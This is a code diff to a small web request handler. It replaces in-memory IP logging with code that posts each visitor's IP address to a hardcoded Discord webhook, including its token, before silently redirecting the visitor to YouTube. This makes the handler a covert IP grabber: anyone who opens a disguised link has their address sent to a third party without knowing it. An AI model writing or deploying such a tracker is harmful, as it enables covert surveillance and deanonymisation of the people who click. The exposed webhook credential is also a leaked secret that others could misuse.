@@ -1,16 +1,28 @@
-// A temporary in-memory storage for logged IPs
-const loggedIPs = [];
+const axios = require("axios");
 
 export default function handler(req, res) {
-  // Get the user's IP address
-  const ipAddress = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  const ipAddress =
+    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
 
-  // Log the IP address
-  loggedIPs.push({ ip: ipAddress, timestamp: new Date() });
+  // Your Discord webhook URL
+  const discordWebhookUrl = "https://discord.com/api/webhooks/1311415884891291809/0tHSM1M2TifTbnfKRjzCJyZxK22CvrRYvSRiE2Ddr7tsnjQQWHCEaXY12KR4gLaNL757"; 
 
-  console.log("Logged IPs:", loggedIPs); // Log to console for debugging
+  // The message you want to send to the webhook
+  const message = {
+    content: `IP Address: ${ipAddress}`,
+  };
 
-  // Redirect to another URL
-  res.writeHead(302, { Location: "https://example.com" }); // Replace with your redirect URL
-  res.end();
+  // Send the IP address to the Discord webhook
+  axios
+    .post(discordWebhookUrl, message)
+    .then(() => {
+      // Redirect to the target URL
+      const redirectUrl = "https://youtube.com"; // Replace with your target URL
+      res.writeHead(302, { Location: redirectUrl });
+      res.end();
+    })
+    .catch((error) => {
+      console.error("Error sending to Discord webhook:", error);
+      res.status(500).send("Internal Server Error");
+    });
 }
